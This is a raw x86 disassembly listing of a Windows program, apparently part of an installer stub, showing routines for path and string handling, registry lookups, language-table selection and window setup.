  403a3e:	0f b7 05 2e a3 40 00 	movzwl 0x40a32e,%eax
  403a45:	c1 e0 10             	shl    $0x10,%eax
  403a48:	0b c1                	or     %ecx,%eax
  403a4a:	33 c9                	xor    %ecx,%ecx
  403a4c:	99                   	cltd
  403a4d:	0b c8                	or     %eax,%ecx
  403a4f:	8b c5                	mov    %ebp,%eax
  403a51:	0b c2                	or     %edx,%eax
  403a53:	8b 17                	mov    (%edi),%edx
  403a55:	3b d1                	cmp    %ecx,%edx
  403a57:	75 07                	jne    0x403a60
  403a59:	8b 57 04             	mov    0x4(%edi),%edx
  403a5c:	3b d0                	cmp    %eax,%edx
  403a5e:	74 06                	je     0x403a66
  403a60:	4f                   	dec    %edi
  403a61:	4f                   	dec    %edi
  403a62:	3b fb                	cmp    %ebx,%edi
  403a64:	73 ed                	jae    0x403a53
  403a66:	33 ed                	xor    %ebp,%ebp
  403a68:	3b fb                	cmp    %ebx,%edi
  403a6a:	c7 44 24 18 b8 a2 40 	movl   $0x40a2b8,0x18(%esp)
  403a71:	00 
  403a72:	72 43                	jb     0x403ab7
  403a74:	66 89 2f             	mov    %bp,(%edi)
  403a77:	83 c7 08             	add    $0x8,%edi
  403a7a:	57                   	push   %edi
  403a7b:	e8 33 26 00 00       	call   0x4060b3
  403a80:	85 c0                	test   %eax,%eax
  403a82:	0f 84 62 01 00 00    	je     0x403bea
  403a88:	57                   	push   %edi
  403a89:	68 00 48 43 00       	push   $0x434800
  403a8e:	e8 49 2c 00 00       	call   0x4066dc
  403a93:	57                   	push   %edi
  403a94:	68 00 50 43 00       	push   $0x435000
  403a99:	e8 3e 2c 00 00       	call   0x4066dc
  403a9e:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403aa2:	83 0d 0c 9b 42 00 ff 	orl    $0xffffffff,0x429b0c
  403aa9:	e8 00 03 00 00       	call   0x403dae
  403aae:	89 44 24 20          	mov    %eax,0x20(%esp)
  403ab2:	e9 33 01 00 00       	jmp    0x403bea
  403ab7:	e8 eb 21 00 00       	call   0x405ca7
  403abc:	56                   	push   %esi
  403abd:	89 44 24 28          	mov    %eax,0x28(%esp)
  403ac1:	e8 2c 2c 00 00       	call   0x4066f2
  403ac6:	ff 74 24 1c          	push   0x1c(%esp)
  403aca:	8b f8                	mov    %eax,%edi
  403acc:	68 00 a0 42 00       	push   $0x42a000
  403ad1:	e8 06 2c 00 00       	call   0x4066dc
  403ad6:	66 39 2d 00 48 43 00 	cmp    %bp,0x434800
  403add:	75 0f                	jne    0x403aee
  403adf:	68 00 58 43 00       	push   $0x435800
  403ae4:	68 00 48 43 00       	push   $0x434800
  403ae9:	e8 ee 2b 00 00       	call   0x4066dc
  403aee:	8d 04 7d 00 68 43 00 	lea    0x436800(,%edi,2),%eax
  403af5:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  403afc:	00 
  403afd:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403b01:	bf 00 c8 42 00       	mov    $0x42c800,%edi
  403b06:	bb 00 d0 42 00       	mov    $0x42d000,%ebx
  403b0b:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403b0f:	0f b7 6c 24 14       	movzwl 0x14(%esp),%ebp
  403b14:	55                   	push   %ebp
  403b15:	68 14 a3 40 00       	push   $0x40a314
  403b1a:	ff 74 24 24          	push   0x24(%esp)
  403b1e:	ff 15 2c 82 40 00    	call   *0x40822c
  403b24:	a1 70 9a 42 00       	mov    0x429a70,%eax
  403b29:	83 c4 0c             	add    $0xc,%esp
  403b2c:	ff b0 20 01 00 00    	push   0x120(%eax)
  403b32:	57                   	push   %edi
  403b33:	e8 e1 2b 00 00       	call   0x406719
  403b38:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  403b3d:	56                   	push   %esi
  403b3e:	74 07                	je     0x403b47
  403b40:	e8 eb 20 00 00       	call   0x405c30
  403b45:	eb 05                	jmp    0x403b4c
  403b47:	e8 3e 21 00 00       	call   0x405c8a
  403b4c:	85 c0                	test   %eax,%eax
  403b4e:	74 3a                	je     0x403b8a
  403b50:	57                   	push   %edi
  403b51:	ff 15 dc 80 40 00    	call   *0x4080dc
  403b57:	f6 c4 04             	test   $0x4,%ah
  403b5a:	75 1f                	jne    0x403b7b
  403b5c:	57                   	push   %edi
  403b5d:	ff 15 44 81 40 00    	call   *0x408144
  403b63:	85 c0                	test   %eax,%eax
  403b65:	74 14                	je     0x403b7b
  403b67:	6a 01                	push   $0x1
  403b69:	56                   	push   %esi
  403b6a:	e8 79 22 00 00       	call   0x405de8
  403b6f:	8b 44 24 10          	mov    0x10(%esp),%eax
  403b73:	ff 44 24 10          	incl   0x10(%esp)
  403b77:	85 c0                	test   %eax,%eax
  403b79:	74 99                	je     0x403b14
  403b7b:	ff 44 24 14          	incl   0x14(%esp)
  403b7f:	33 ed                	xor    %ebp,%ebp
  403b81:	66 39 6c 24 14       	cmp    %bp,0x14(%esp)
  403b86:	75 83                	jne    0x403b0b
  403b88:	eb 60                	jmp    0x403bea
  403b8a:	56                   	push   %esi
  403b8b:	ff 15 e0 80 40 00    	call   *0x4080e0
  403b91:	6a 00                	push   $0x0
  403b93:	56                   	push   %esi
  403b94:	e8 03 29 00 00       	call   0x40649c
  403b99:	6a 01                	push   $0x1
  403b9b:	57                   	push   %edi
  403b9c:	68 00 78 43 00       	push   $0x437800
  403ba1:	ff 15 b4 80 40 00    	call   *0x4080b4
  403ba7:	85 c0                	test   %eax,%eax
  403ba9:	74 3d                	je     0x403be8
  403bab:	6a 00                	push   $0x0
  403bad:	57                   	push   %edi
  403bae:	e8 e9 28 00 00       	call   0x40649c
  403bb3:	a1 70 9a 42 00       	mov    0x429a70,%eax
  403bb8:	ff b0 24 01 00 00    	push   0x124(%eax)
  403bbe:	53                   	push   %ebx
  403bbf:	e8 55 2b 00 00       	call   0x406719
  403bc4:	53                   	push   %ebx
  403bc5:	e8 f5 20 00 00       	call   0x405cbf
  403bca:	85 c0                	test   %eax,%eax
  403bcc:	75 44                	jne    0x403c12
  403bce:	8b 44 24 10          	mov    0x10(%esp),%eax
  403bd2:	ff 44 24 10          	incl   0x10(%esp)
  403bd6:	85 c0                	test   %eax,%eax
  403bd8:	75 0e                	jne    0x403be8
  403bda:	57                   	push   %edi
  403bdb:	e8 59 2e 00 00       	call   0x406a39
  403be0:	85 c0                	test   %eax,%eax
  403be2:	0f 84 2c ff ff ff    	je     0x403b14
  403be8:	33 ed                	xor    %ebp,%ebp
  403bea:	e8 cd 00 00 00       	call   0x403cbc
  403bef:	ff 15 94 82 40 00    	call   *0x408294
  403bf5:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  403bf9:	5b                   	pop    %ebx
  403bfa:	74 24                	je     0x403c20
  403bfc:	68 10 00 20 00       	push   $0x200010
  403c01:	ff 74 24 18          	push   0x18(%esp)
  403c05:	e8 32 21 00 00       	call   0x405d3c
  403c0a:	6a 02                	push   $0x2
  403c0c:	ff 15 6c 81 40 00    	call   *0x40816c
  403c12:	50                   	push   %eax
  403c13:	ff 15 fc 80 40 00    	call   *0x4080fc
  403c19:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403c1e:	eb c8                	jmp    0x403be8
  403c20:	39 2d f4 9a 42 00    	cmp    %ebp,0x429af4
  403c26:	74 7c                	je     0x403ca4
  403c28:	8d 44 24 20          	lea    0x20(%esp),%eax
  403c2c:	50                   	push   %eax
  403c2d:	6a 28                	push   $0x28
  403c2f:	ff 15 bc 80 40 00    	call   *0x4080bc
  403c35:	50                   	push   %eax
  403c36:	ff 15 24 80 40 00    	call   *0x408024
  403c3c:	85 c0                	test   %eax,%eax
  403c3e:	74 34                	je     0x403c74
  403c40:	8d 44 24 28          	lea    0x28(%esp),%eax
  403c44:	50                   	push   %eax
  403c45:	68 ec a2 40 00       	push   $0x40a2ec
  403c4a:	55                   	push   %ebp
  403c4b:	ff 15 20 80 40 00    	call   *0x408020
  403c51:	55                   	push   %ebp
  403c52:	55                   	push   %ebp
  403c53:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403c57:	55                   	push   %ebp
  403c58:	50                   	push   %eax
  403c59:	55                   	push   %ebp
  403c5a:	ff 74 24 34          	push   0x34(%esp)
  403c5e:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403c65:	00 
  403c66:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403c6d:	00 
  403c6e:	ff 15 1c 80 40 00    	call   *0x40801c
  403c74:	6a 04                	push   $0x4
  403c76:	e8 55 2e 00 00       	call   0x406ad0
  403c7b:	3b c5                	cmp    %ebp,%eax
  403c7d:	be 02 00 04 80       	mov    $0x80040002,%esi
  403c82:	74 0c                	je     0x403c90
  403c84:	56                   	push   %esi
  403c85:	6a 25                	push   $0x25
  403c87:	55                   	push   %ebp
  403c88:	55                   	push   %ebp
  403c89:	55                   	push   %ebp
  403c8a:	ff d0                	call   *%eax
  403c8c:	85 c0                	test   %eax,%eax
  403c8e:	74 0d                	je     0x403c9d
  403c90:	56                   	push   %esi
  403c91:	6a 02                	push   $0x2
  403c93:	ff 15 0c 82 40 00    	call   *0x40820c
  403c99:	85 c0                	test   %eax,%eax
  403c9b:	75 07                	jne    0x403ca4
  403c9d:	6a 09                	push   $0x9
  403c9f:	e8 67 d7 ff ff       	call   0x40140b
  403ca4:	a1 0c 9b 42 00       	mov    0x429b0c,%eax
  403ca9:	83 f8 ff             	cmp    $0xffffffff,%eax
  403cac:	74 04                	je     0x403cb2
  403cae:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403cb2:	ff 74 24 1c          	push   0x1c(%esp)
  403cb6:	ff 15 6c 81 40 00    	call   *0x40816c
  403cbc:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403cc1:	56                   	push   %esi
  403cc2:	8b 35 fc 80 40 00    	mov    0x4080fc,%esi
  403cc8:	83 f8 ff             	cmp    $0xffffffff,%eax
  403ccb:	74 0a                	je     0x403cd7
  403ccd:	50                   	push   %eax
  403cce:	ff d6                	call   *%esi
  403cd0:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403cd7:	a1 1c a0 40 00       	mov    0x40a01c,%eax
  403cdc:	83 f8 ff             	cmp    $0xffffffff,%eax
  403cdf:	74 0a                	je     0x403ceb
  403ce1:	50                   	push   %eax
  403ce2:	ff d6                	call   *%esi
  403ce4:	83 0d 1c a0 40 00 ff 	orl    $0xffffffff,0x40a01c
  403ceb:	e8 29 00 00 00       	call   0x403d19
  403cf0:	6a 07                	push   $0x7
  403cf2:	68 00 70 43 00       	push   $0x437000
  403cf7:	e8 ec 20 00 00       	call   0x405de8
  403cfc:	5e                   	pop    %esi
  403cfd:	c3                   	ret
  403cfe:	56                   	push   %esi
  403cff:	8b 35 10 0f 42 00    	mov    0x420f10,%esi
  403d05:	eb 0a                	jmp    0x403d11
  403d07:	ff 74 24 08          	push   0x8(%esp)
  403d0b:	ff 56 04             	call   *0x4(%esi)
  403d0e:	8b 36                	mov    (%esi),%esi
  403d10:	59                   	pop    %ecx
  403d11:	85 f6                	test   %esi,%esi
  403d13:	75 f2                	jne    0x403d07
  403d15:	5e                   	pop    %esi
  403d16:	c2 04 00             	ret    $0x4
  403d19:	56                   	push   %esi
  403d1a:	8b 35 10 0f 42 00    	mov    0x420f10,%esi
  403d20:	6a 00                	push   $0x0
  403d22:	e8 d7 ff ff ff       	call   0x403cfe
  403d27:	85 f6                	test   %esi,%esi
  403d29:	74 1a                	je     0x403d45
  403d2b:	57                   	push   %edi
  403d2c:	8b fe                	mov    %esi,%edi
  403d2e:	8b 36                	mov    (%esi),%esi
  403d30:	ff 77 08             	push   0x8(%edi)
  403d33:	ff 15 1c 81 40 00    	call   *0x40811c
  403d39:	57                   	push   %edi
  403d3a:	ff 15 0c 81 40 00    	call   *0x40810c
  403d40:	85 f6                	test   %esi,%esi
  403d42:	75 e8                	jne    0x403d2c
  403d44:	5f                   	pop    %edi
  403d45:	83 25 10 0f 42 00 00 	andl   $0x0,0x420f10
  403d4c:	5e                   	pop    %esi
  403d4d:	c3                   	ret
  403d4e:	a1 10 0f 42 00       	mov    0x420f10,%eax
  403d53:	eb 0b                	jmp    0x403d60
  403d55:	8b 48 08             	mov    0x8(%eax),%ecx
  403d58:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403d5c:	74 0a                	je     0x403d68
  403d5e:	8b 00                	mov    (%eax),%eax
  403d60:	85 c0                	test   %eax,%eax
  403d62:	75 f1                	jne    0x403d55
  403d64:	40                   	inc    %eax
  403d65:	c2 04 00             	ret    $0x4
  403d68:	33 c0                	xor    %eax,%eax
  403d6a:	eb f9                	jmp    0x403d65
  403d6c:	56                   	push   %esi
  403d6d:	8b 74 24 08          	mov    0x8(%esp),%esi
  403d71:	56                   	push   %esi
  403d72:	e8 d7 ff ff ff       	call   0x403d4e
  403d77:	85 c0                	test   %eax,%eax
  403d79:	75 03                	jne    0x403d7e
  403d7b:	40                   	inc    %eax
  403d7c:	eb 2c                	jmp    0x403daa
  403d7e:	6a 0c                	push   $0xc
  403d80:	6a 40                	push   $0x40
  403d82:	ff 15 10 81 40 00    	call   *0x408110
  403d88:	85 c0                	test   %eax,%eax
  403d8a:	74 1b                	je     0x403da7
  403d8c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403d90:	89 70 08             	mov    %esi,0x8(%eax)
  403d93:	89 48 04             	mov    %ecx,0x4(%eax)
  403d96:	8b 0d 10 0f 42 00    	mov    0x420f10,%ecx
  403d9c:	89 08                	mov    %ecx,(%eax)
  403d9e:	a3 10 0f 42 00       	mov    %eax,0x420f10
  403da3:	33 c0                	xor    %eax,%eax
  403da5:	eb 03                	jmp    0x403daa
  403da7:	83 c8 ff             	or     $0xffffffff,%eax
  403daa:	5e                   	pop    %esi
  403dab:	c2 08 00             	ret    $0x8
  403dae:	83 ec 10             	sub    $0x10,%esp
  403db1:	53                   	push   %ebx
  403db2:	55                   	push   %ebp
  403db3:	56                   	push   %esi
  403db4:	8b 35 70 9a 42 00    	mov    0x429a70,%esi
  403dba:	57                   	push   %edi
  403dbb:	6a 02                	push   $0x2
  403dbd:	e8 0e 2d 00 00       	call   0x406ad0
  403dc2:	33 ff                	xor    %edi,%edi
  403dc4:	3b c7                	cmp    %edi,%eax
  403dc6:	74 12                	je     0x403dda
  403dc8:	ff d0                	call   *%eax
  403dca:	0f b7 c0             	movzwl %ax,%eax
  403dcd:	50                   	push   %eax
  403dce:	68 00 60 43 00       	push   $0x436000
  403dd3:	e8 4b 28 00 00       	call   0x406623
  403dd8:	eb 5a                	jmp    0x403e34
  403dda:	bb 50 2f 42 00       	mov    $0x422f50,%ebx
  403ddf:	57                   	push   %edi
  403de0:	53                   	push   %ebx
  403de1:	57                   	push   %edi
  403de2:	68 90 83 40 00       	push   $0x408390
  403de7:	68 01 00 00 80       	push   $0x80000001
  403dec:	66 c7 05 00 60 43 00 	movw   $0x30,0x436000
  403df3:	30 00 
  403df5:	66 c7 05 02 60 43 00 	movw   $0x78,0x436002
  403dfc:	78 00 
  403dfe:	66 89 3d 04 60 43 00 	mov    %di,0x436004
  403e05:	e8 a0 27 00 00       	call   0x4065aa
  403e0a:	66 39 3d 50 2f 42 00 	cmp    %di,0x422f50
  403e11:	75 16                	jne    0x403e29
  403e13:	57                   	push   %edi
  403e14:	53                   	push   %ebx
  403e15:	68 cc 83 40 00       	push   $0x4083cc
  403e1a:	68 40 83 40 00       	push   $0x408340
  403e1f:	68 03 00 00 80       	push   $0x80000003
  403e24:	e8 81 27 00 00       	call   0x4065aa
  403e29:	53                   	push   %ebx
  403e2a:	68 00 60 43 00       	push   $0x436000
  403e2f:	e8 c4 28 00 00       	call   0x4066f8
  403e34:	e8 4b 02 00 00       	call   0x404084
  403e39:	a1 78 9a 42 00       	mov    0x429a78,%eax
  403e3e:	bd 00 48 43 00       	mov    $0x434800,%ebp
  403e43:	83 e0 20             	and    $0x20,%eax
  403e46:	55                   	push   %ebp
  403e47:	a3 e0 9a 42 00       	mov    %eax,0x429ae0
  403e4c:	c7 05 fc 9a 42 00 00 	movl   $0x10000,0x429afc
  403e53:	00 01 00 
  403e56:	e8 58 22 00 00       	call   0x4060b3
  403e5b:	85 c0                	test   %eax,%eax
  403e5d:	0f 85 8c 00 00 00    	jne    0x403eef
  403e63:	8b 4e 48             	mov    0x48(%esi),%ecx
  403e66:	3b cf                	cmp    %edi,%ecx
  403e68:	0f 84 81 00 00 00    	je     0x403eef
  403e6e:	8b 56 4c             	mov    0x4c(%esi),%edx
  403e71:	a1 98 9a 42 00       	mov    0x429a98,%eax
  403e76:	bb 00 7a 42 00       	mov    $0x427a00,%ebx
  403e7b:	57                   	push   %edi
  403e7c:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403e7f:	53                   	push   %ebx
  403e80:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403e83:	52                   	push   %edx
  403e84:	50                   	push   %eax
  403e85:	ff 76 44             	push   0x44(%esi)
  403e88:	e8 1d 27 00 00       	call   0x4065aa
  403e8d:	66 a1 00 7a 42 00    	mov    0x427a00,%ax
  403e93:	66 3b c7             	cmp    %di,%ax
  403e96:	74 57                	je     0x403eef
  403e98:	66 3d 22 00          	cmp    $0x22,%ax
  403e9c:	75 10                	jne    0x403eae
  403e9e:	bb 02 7a 42 00       	mov    $0x427a02,%ebx
  403ea3:	6a 22                	push   $0x22
  403ea5:	53                   	push   %ebx
  403ea6:	e8 2d 21 00 00       	call   0x405fd8
  403eab:	66 89 38             	mov    %di,(%eax)
  403eae:	53                   	push   %ebx
  403eaf:	e8 3e 28 00 00       	call   0x4066f2
  403eb4:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403eb8:	3b c3                	cmp    %ebx,%eax
  403eba:	76 26                	jbe    0x403ee2
  403ebc:	68 b0 a3 40 00       	push   $0x40a3b0
  403ec1:	50                   	push   %eax
  403ec2:	ff 15 00 81 40 00    	call   *0x408100
  403ec8:	85 c0                	test   %eax,%eax
  403eca:	75 16                	jne    0x403ee2
  403ecc:	53                   	push   %ebx
  403ecd:	ff 15 dc 80 40 00    	call   *0x4080dc
  403ed3:	83 f8 ff             	cmp    $0xffffffff,%eax
  403ed6:	74 04                	je     0x403edc
  403ed8:	a8 10                	test   $0x10,%al
  403eda:	75 06                	jne    0x403ee2
  403edc:	53                   	push   %ebx
  403edd:	e8 15 21 00 00       	call   0x405ff7
  403ee2:	53                   	push   %ebx
  403ee3:	e8 c3 20 00 00       	call   0x405fab
  403ee8:	50                   	push   %eax
  403ee9:	55                   	push   %ebp
  403eea:	e8 ed 27 00 00       	call   0x4066dc
  403eef:	55                   	push   %ebp
  403ef0:	e8 be 21 00 00       	call   0x4060b3
  403ef5:	85 c0                	test   %eax,%eax
  403ef7:	75 0c                	jne    0x403f05
  403ef9:	ff b6 18 01 00 00    	push   0x118(%esi)
  403eff:	55                   	push   %ebp
  403f00:	e8 14 28 00 00       	call   0x406719
  403f05:	68 40 80 00 00       	push   $0x8040
  403f0a:	57                   	push   %edi
  403f0b:	57                   	push   %edi
  403f0c:	6a 01                	push   $0x1
  403f0e:	6a 67                	push   $0x67
  403f10:	ff 35 60 9a 42 00    	push   0x429a60
  403f16:	ff 15 44 82 40 00    	call   *0x408244
  403f1c:	a3 48 8a 42 00       	mov    %eax,0x428a48
  403f21:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403f25:	bb 00 8a 42 00       	mov    $0x428a00,%ebx
  403f2a:	74 7f                	je     0x403fab
  403f2c:	8b 0d 60 9a 42 00    	mov    0x429a60,%ecx
  403f32:	be a8 a3 40 00       	mov    $0x40a3a8,%esi
  403f37:	53                   	push   %ebx
  403f38:	c7 05 04 8a 42 00 00 	movl   $0x401000,0x428a04
  403f3f:	10 40 00 
  403f42:	89 0d 10 8a 42 00    	mov    %ecx,0x428a10
  403f48:	a3 14 8a 42 00       	mov    %eax,0x428a14
  403f4d:	89 35 24 8a 42 00    	mov    %esi,0x428a24
  403f53:	ff 15 f4 81 40 00    	call   *0x4081f4
  403f59:	66 85 c0             	test   %ax,%ax
  403f5c:	0f 84 18 01 00 00    	je     0x40407a
  403f62:	8d 44 24 10          	lea    0x10(%esp),%eax
  403f66:	57                   	push   %edi
  403f67:	50                   	push   %eax
  403f68:	57                   	push   %edi
  403f69:	6a 30                	push   $0x30
  403f6b:	ff 15 f8 81 40 00    	call   *0x4081f8
  403f71:	57                   	push   %edi
  403f72:	ff 35 60 9a 42 00    	push   0x429a60
  403f78:	8b 44 24 24          	mov    0x24(%esp),%eax
  403f7c:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403f80:	57                   	push   %edi
  403f81:	57                   	push   %edi
  403f82:	50                   	push   %eax
  403f83:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403f87:	2b 44 24 24          	sub    0x24(%esp),%eax
  403f8b:	50                   	push   %eax
  403f8c:	ff 74 24 2c          	push   0x2c(%esp)
  403f90:	ff 74 24 2c          	push   0x2c(%esp)
  403f94:	68 00 00 00 80       	push   $0x80000000
  403f99:	57                   	push   %edi
  403f9a:	56                   	push   %esi
  403f9b:	68 80 00 00 00       	push   $0x80
  403fa0:	ff 15 80 82 40 00    	call   *0x408280
  403fa6:	a3 30 2f 42 00       	mov    %eax,0x422f30
  403fab:	57                   	push   %edi
  403fac:	e8 5a d4 ff ff       	call   0x40140b
  403fb1:	85 c0                	test   %eax,%eax
  403fb3:	74 08                	je     0x403fbd
  403fb5:	6a 02                	push   $0x2
  403fb7:	58                   	pop    %eax
  403fb8:	e9 bf 00 00 00       	jmp    0x40407c
  403fbd:	e8 c2 00 00 00       	call   0x404084
  403fc2:	39 3d 00 9b 42 00    	cmp    %edi,0x429b00
  403fc8:	0f 85 83 00 00 00    	jne    0x404051
  403fce:	6a 05                	push   $0x5
  403fd0:	ff 35 30 2f 42 00    	push   0x422f30
  403fd6:	ff 15 28 82 40 00    	call   *0x408228
  403fdc:	68 34 83 40 00       	push   $0x408334
  403fe1:	e8 7a 2a 00 00       	call   0x406a60
  403fe6:	85 c0                	test   %eax,%eax
  403fe8:	75 0a                	jne    0x403ff4
  403fea:	68 28 83 40 00       	push   $0x408328
  403fef:	e8 6c 2a 00 00       	call   0x406a60
  403ff4:	8b 35 00 82 40 00    	mov    0x408200,%esi
  403ffa:	bd 10 83 40 00       	mov    $0x408310,%ebp
  403fff:	53                   	push   %ebx
  404000:	55                   	push   %ebp
  404001:	57                   	push   %edi
  404002:	ff d6                	call   *%esi
  404004:	85 c0                	test   %eax,%eax
  404006:	75 16                	jne    0x40401e
  404008:	53                   	push   %ebx
  404009:	68 fc 82 40 00       	push   $0x4082fc
  40400e:	57                   	push   %edi
  40400f:	ff d6                	call   *%esi
  404011:	53                   	push   %ebx
  404012:	89 2d 24 8a 42 00    	mov    %ebp,0x428a24
  404018:	ff 15 f4 81 40 00    	call   *0x4081f4
  40401e:	a1 40 8a 42 00       	mov    0x428a40,%eax
  404023:	57                   	push   %edi
  404024:	83 c0 69             	add    $0x69,%eax
  404027:	68 5c 41 40 00       	push   $0x40415c
  40402c:	0f b7 c0             	movzwl %ax,%eax
  40402f:	57                   	push   %edi
  404030:	50                   	push   %eax
  404031:	ff 35 60 9a 42 00    	push   0x429a60
  404037:	ff 15 04 82 40 00    	call   *0x408204
  40403d:	6a 05                	push   $0x5
  40403f:	8b f0                	mov    %eax,%esi
  404041:	e8 c5 d3 ff ff       	call   0x40140b
  404046:	6a 01                	push   $0x1
  404048:	e8 b1 fc ff ff       	call   0x403cfe
  40404d:	8b c6                	mov    %esi,%eax
  40404f:	eb 2b                	jmp    0x40407c
  404051:	57                   	push   %edi
  404052:	e8 dd 17 00 00       	call   0x405834
  404057:	85 c0                	test   %eax,%eax
  404059:	74 18                	je     0x404073
  40405b:	39 3d 2c 8a 42 00    	cmp    %edi,0x428a2c
  404061:	0f 85 4e ff ff ff    	jne    0x403fb5
  404067:	6a 02                	push   $0x2
  404069:	e8 9d d3 ff ff       	call   0x40140b
  40406e:	e9 42 ff ff ff       	jmp    0x403fb5
  404073:	6a 01                	push   $0x1
  404075:	e8 91 d3 ff ff       	call   0x40140b
  40407a:	33 c0                	xor    %eax,%eax
  40407c:	5f                   	pop    %edi
  40407d:	5e                   	pop    %esi
  40407e:	5d                   	pop    %ebp
  40407f:	5b                   	pop    %ebx
  404080:	83 c4 10             	add    $0x10,%esp
  404083:	c3                   	ret
  404084:	53                   	push   %ebx
  404085:	55                   	push   %ebp
  404086:	56                   	push   %esi
  404087:	57                   	push   %edi
  404088:	bf 00 60 43 00       	mov    $0x436000,%edi
  40408d:	bb ff ff 00 00       	mov    $0xffff,%ebx
  404092:	57                   	push   %edi
  404093:	e8 a4 25 00 00       	call   0x40663c
  404098:	8b 35 a4 9a 42 00    	mov    0x429aa4,%esi
  40409e:	85 f6                	test   %esi,%esi
  4040a0:	74 45                	je     0x4040e7
  4040a2:	8b 0d 70 9a 42 00    	mov    0x429a70,%ecx
  4040a8:	8b 49 64             	mov    0x64(%ecx),%ecx
  4040ab:	8b d1                	mov    %ecx,%edx
  4040ad:	0f af ce             	imul   %esi,%ecx
  4040b0:	f7 da                	neg    %edx
  4040b2:	03 0d a0 9a 42 00    	add    0x429aa0,%ecx
  4040b8:	03 ca                	add    %edx,%ecx
  4040ba:	4e                   	dec    %esi
  4040bb:	66 8b 29             	mov    (%ecx),%bp
  4040be:	66 33 e8             	xor    %ax,%bp
  4040c1:	23 eb                	and    %ebx,%ebp
  4040c3:	66 85 ed             	test   %bp,%bp
  4040c6:	74 06                	je     0x4040ce
  4040c8:	85 f6                	test   %esi,%esi
  4040ca:	75 ec                	jne    0x4040b8
  4040cc:	eb 19                	jmp    0x4040e7
  4040ce:	8b 51 02             	mov    0x2(%ecx),%edx
  4040d1:	89 15 40 8a 42 00    	mov    %edx,0x428a40
  4040d7:	8b 51 06             	mov    0x6(%ecx),%edx
  4040da:	89 15 08 9b 42 00    	mov    %edx,0x429b08
  4040e0:	8d 51 0a             	lea    0xa(%ecx),%edx
  4040e3:	85 d2                	test   %edx,%edx
  4040e5:	75 12                	jne    0x4040f9
  4040e7:	66 81 fb ff ff       	cmp    $0xffff,%bx
  4040ec:	75 07                	jne    0x4040f5
  4040ee:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  4040f3:	eb a3                	jmp    0x404098
  4040f5:	33 db                	xor    %ebx,%ebx
  4040f7:	eb 9f                	jmp    0x404098
  4040f9:	89 15 3c 8a 42 00    	mov    %edx,0x428a3c
  4040ff:	0f b7 01             	movzwl (%ecx),%eax
  404102:	50                   	push   %eax
  404103:	57                   	push   %edi
  404104:	e8 1a 25 00 00       	call   0x406623
  404109:	e8 2f 00 00 00       	call   0x40413d
  40410e:	a1 8c 9a 42 00       	mov    0x429a8c,%eax
  404113:	8b 35 88 9a 42 00    	mov    0x429a88,%esi
  404119:	85 c0                	test   %eax,%eax
  40411b:	74 1b                	je     0x404138
  40411d:	8b f8                	mov    %eax,%edi
  40411f:	8b 06                	mov    (%esi),%eax
  404121:	85 c0                	test   %eax,%eax
  404123:	74 0a                	je     0x40412f
  404125:	50                   	push   %eax
  404126:	8d 46 18             	lea    0x18(%esi),%eax
  404129:	50                   	push   %eax
  40412a:	e8 ea 25 00 00       	call   0x406719
  40412f:	81 c6 18 08 00 00    	add    $0x818,%esi
  404135:	4f                   	dec    %edi
  404136:	75 e7                	jne    0x40411f
  404138:	5f                   	pop    %edi
  404139:	5e                   	pop    %esi
  40413a:	5d                   	pop    %ebp
  40413b:	5b                   	pop    %ebx
  40413c:	c3                   	ret
  40413d:	56                   	push   %esi
  40413e:	be 60 8a 42 00       	mov    $0x428a60,%esi
  404143:	6a fe                	push   $0xfffffffe
  404145:	56                   	push   %esi
  404146:	e8 ce 25 00 00       	call   0x406719
  40414b:	56                   	push   %esi
  40414c:	ff 35 30 2f 42 00    	push   0x422f30
  404152:	ff 15 1c 82 40 00    	call   *0x40821c
  404158:	8b c6                	mov    %esi,%eax
  40415a:	5e                   	pop    %esi
  40415b:	c3                   	ret
  40415c:	83 ec 10             	sub    $0x10,%esp
  40415f:	b9 10 01 00 00       	mov    $0x110,%ecx
  404164:	53                   	push   %ebx
  404165:	55                   	push   %ebp
  404166:	56                   	push   %esi
  404167:	8b 74 24 24          	mov    0x24(%esp),%esi
  40416b:	3b f1                	cmp    %ecx,%esi
  40416d:	57                   	push   %edi
  40416e:	0f 84 61 01 00 00    	je     0x4042d5
  404174:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  40417a:	0f 84 55 01 00 00    	je     0x4042d5
  404180:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404184:	33 ed                	xor    %ebp,%ebp
  404186:	83 fe 47             	cmp    $0x47,%esi
  404189:	75 13                	jne    0x40419e
  40418b:	6a 13                	push   $0x13
  40418d:	55                   	push   %ebp
  40418e:	55                   	push   %ebp
  40418f:	55                   	push   %ebp
  404190:	55                   	push   %ebp
  404191:	57                   	push   %edi
  404192:	ff 35 30 2f 42 00    	push   0x422f30
  404198:	ff 15 d0 81 40 00    	call   *0x4081d0
  40419e:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4041a2:	83 fe 05             	cmp    $0x5,%esi
  4041a5:	75 42                	jne    0x4041e9
  4041a7:	8b c3                	mov    %ebx,%eax
  4041a9:	48                   	dec    %eax
  4041aa:	f7 d8                	neg    %eax
  4041ac:	1b c0                	sbb    %eax,%eax
  4041ae:	83 e0 05             	and    $0x5,%eax
  4041b1:	50                   	push   %eax
  4041b2:	ff 35 30 2f 42 00    	push   0x422f30
  4041b8:	ff 15 28 82 40 00    	call   *0x408228
